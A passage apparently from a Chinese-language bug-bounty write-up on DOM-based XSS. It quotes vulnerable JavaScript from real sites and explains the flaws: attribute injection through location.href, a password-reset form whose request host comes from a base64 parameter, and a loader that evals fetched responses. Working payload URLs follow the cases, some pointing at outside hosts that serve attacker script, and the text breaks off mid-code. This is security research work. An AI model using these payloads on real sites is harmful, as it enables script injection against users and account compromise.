                h || (e += q.createLabel(a)); 
                a.validation && a.validation.required && f.push("capture_required"); 
                b += ""; 
                e = "checkbox" === a.type || "radio" === a.type ? e + q.createLabel(a, 
b) : e + b; 
                a.modify && q.attachModifyEventHandler(a); 
                a.publicPrivateToggle && (e += q.createPublicPrivateToggle(a)); 
                n && (e += ""); 
                k || (e += q.createTip(a)); 
                a.profileStoragePath && "undefined" === typeof a.value && q.setElementAt
tributeWithLocalStorage(a, c + d, "value"); 
                return e 
            }, 
                    d.appendChild(q.domHelpers.createInput({ 
                       elementType: "hidden", 
                       fieldPrefix: c, 
                       elementName: "redirect_uri", 
                       elementId: "redirect_uri_" + b, 
                       elementValue: janrain.settings.capture.redirectUri 
                   })); 
根据上⽂ janrain.settings.capture.redirectUri = location.href  
所以 janrain.settings.capture.redirectUri 我们可以控制 
第⼀段代码虽然看起来眼花缭乱，但是⼤致⼀看就会知道这是在创建input标签，这⼀⼤堆代码根本不重要，重点在于 
b += "value='" + wd(a.elementValue) + "' "; b = b + ("type='" + l + "' ")  
精简等同于 
b += "value='"+location.href+"'type='hidden'"  
显然这是给  标签添加value和type,但是value是单引号引⽤， location.href 已经说过可以跳出单引号， 但是
  的Xss 很鸡肋，不过在 type= 前⾯可以加任何属性，可以先给 type 赋值,浏览器⾃然会忽略
后⾯的 type=hidden 赋值，这样就很容易就可以Xss
Payload https://test.com/xss#'autofocus=''onfocus='alert(1)'type='input
Case 3
概括： XMLHttpRequest 的⽬标url可控,可以控制响应注⼊可以造成Xss的内容 
我之前有⼀个⽂章 https://jinone.github.io/bugbounty-a-dom-xss/ 就算⼀个案例
----- 1
 $(document).ready(function() { 
                $('#resetform').on("submit",function(e) {     
                    e.preventDefault();
                    if(getParameterByName("target")){ 
                    var password = $("#resetform").find("input[name='password']"); 
                    var referenceID = getParameterByName("referenceID"); 
                    var referenceType = getParameterByName("referenceType") 
                    var token = getParameterByName("token"); 
                    var target = window.atob(getParameterByName("target")); 
                    var url = "https://" + target + "/api/v1/reset/" + referenceID; 
                    var request = new XMLHttpRequest();  
                    request.open("PUT", url, true);  
                    request.setRequestHeader("Content-type", "application/x-www-form-url
encoded"); 
                    request.onreadystatechange = function() {  
                        if(request.readyState == request.DONE) { 
                            var response = request.responseText; 
                            var obj = JSON.parse(response); 
                            if (request.status == 200) { 
                                window.location.replace("thank-you.html"); 
                            }else{
                                document.getElementById("errormsg").innerHTML = obj['Des
cription']; 
                                document.getElementById("errormsg").style.display = "blo
ck"; 
                                document.getElementById("errormsg").scrollIntoView();  
                            } 
                        } 
                    }  
                    request.send("password="+password.val()+"&token="+token+"&referenceT
ype="+referenceType); 
                    }else{ 
                        document.getElementById("errormsg").innerHTML = "There was a pro
blem with your password reset."; 
                        document.getElementById("errormsg").style.display = "block"; 
                        document.getElementById("errormsg").scrollIntoView();  
                    } 
                    return false; 
                }); 
            }); 
代码就是要从参数target(base64解密)获取 host 拼接到url⾥⾯ 发送请求 判断响应是否为200 如果不是就会把响应包的
Description json 值写在页⾯
可以把⼀个脚本放在服务器
"}'; 
?> 
由于这个 var url = "https://" + target + "/api/v1/reset/" + referenceID; ,后⾯还有内容 
可以使⽤ test.com/xss.php? 把后⾯的忽略掉, 再经过base64编码
Payload https://test.com/reset?target=dGVzdC5jb20veHNzLnBocD8=
----- 2
_h_processUrlArgs: function() { 
        var 
            h_search = document.location.search, 
            h_args, 
            h_property, 
            h_i, h_cnt; 
        if (!h_search) { 
            return; 
        } 
        h_args = h_search.substr(1).split('&'); 
        for (h_i = 0, h_cnt = h_args.length; h_i < h_cnt; h_i++) { 
            h_property = h_args[h_i].split('='); 
            switch (h_property[0]) { 
                case 'h_debug': 
                    this._h_debugMode = true; 
                    break; 
                case 'weblibFiles': 
                    kio.lib._h_buildDescription.h_weblibFiles.h_path = this._h_getPath(h
_property[1]); 
                    this._h_getFile(h_property[1], 'kio.lib._h_buildDescription.h_weblib
Files.h_files'); 
                    this._h_normalizeBuildDescription(kio.lib._h_buildDescription.h_webl
ibFiles); 
                    break; 
                case 'appFiles': 
                    kio.lib._h_buildDescription.h_appFiles.h_path = document.location.or
igin + this._h_getPath(h_property[1]); 
                    this._h_getFile(h_property[1], 'kio.lib._h_buildDescription.h_appFil
es.h_files'); 
                    this._h_normalizeBuildDescription(kio.lib._h_buildDescription.h_appF
iles); 
                    break; 
            } 
        } 
    }, 
    _h_getPath: function(h_url) { 
        var h_p = h_url.lastIndexOf('/'); 
        if (-1 !== h_p) { 
            h_url = h_url.substr(0, h_p); 
        } 
        return h_url; 
    }, 
    _h_getFile: function(h_url, h_variableName) { 
        var h_xhr; 
        if (window.XMLHttpRequest) { 
            h_xhr = new window.XMLHttpRequest(); 
        } else if (window.ActiveXObject) { 
            h_xhr = new window.ActiveXObject('Microsoft.XMLHTTP'); 
        } 
        if (!h_xhr) { 
            this.h_reportError('Internal error: Cannot load ' + h_url, 'kLib.js'); 
            return; 
        } 
        h_xhr.open('GET', h_url, false); 
        h_xhr.send(null); 
        if (h_variableName) { 
            eval(h_variableName + '=' + h_xhr.responseText + ';'); 
        } else { 
            eval(h_xhr.responseText); 
        } 
    }, 
从 document.location.search 中通过switch匹配参数名，执⾏对应操作，传⼊参数值为 h_url ，通过xhr获取响应，
然后竟然直接eval，没有任何引号包裹， weblibFiles 和 appFiles 都可以，只需要准备⼀个js地址。
Payload https://test.com/xss?appFiles=//15.rs/
上述案例相当于是⼀些Dom xss的形式，再查找这种类型漏洞，可以多关注。
奇葩案例
----- 1
这个在⼀处oauth
        qs: function(e, t, n) { 
            if (t) 
                for (var i in n = n || encodeURIComponent, 
                t) { 
                    var o = new RegExp("([\\?\\&])" + i + "=[^\\&]*"); 
                    e.match(o) && (e = e.replace(o, "$1" + i + "=" + n(t[i])), 
                    delete t[i]) 
                } 
            return this.isEmpty(t) ? e : e + (-1 < e.indexOf("?") ? "&" : "?") + this.pa
ram(t, n) 
        }, 
        param: function(e, t) { 
            var n, i, o = {}; 
            if ("string" == typeof e) {
                if (t = t || decodeURIComponent, 
                i = e.replace(/^[\#\?]/, "").match(/([^=\/\&]+)=([^\&]+)/g)) 
                    for (var a = 0; a < i.length; a++) 
                        o[(n = i[a].match(/([^=]+)=(.*)/))[1]] = t(n[2]); 
                return o 
            } 
            t = t || encodeURIComponent; 
            var r, s = e, o = []; 
            for (r in s) 
                s.hasOwnProperty(r) && s.hasOwnProperty(r) && o.push([r, "?" === s[r] ? 
"?" : t(s[r])].join("=")); 
            return o.join("&") 
        }, 
      responseHandler: function(e, t) {
            var a = this 
              , n = e.location 